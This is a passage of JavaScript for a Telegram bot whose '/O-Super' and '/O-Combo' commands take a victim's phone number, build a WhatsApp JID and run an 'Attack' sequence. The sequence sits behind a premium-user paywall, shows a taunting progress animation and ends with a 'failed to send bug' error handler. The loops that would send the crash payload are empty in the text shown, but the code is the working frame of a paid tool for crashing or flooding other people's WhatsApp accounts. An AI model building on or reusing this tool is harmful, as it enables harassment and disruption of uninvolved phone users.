        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
   
      for (let i = 0; i <= 70; i++){  
      
  }
  
  console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});  

bot.onText(/\/O-Super (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;


const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 20; i++) {
      
     }
    console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Combo (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
  for (let i = 0; i <= 20; i++) {   
      
      }
  console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
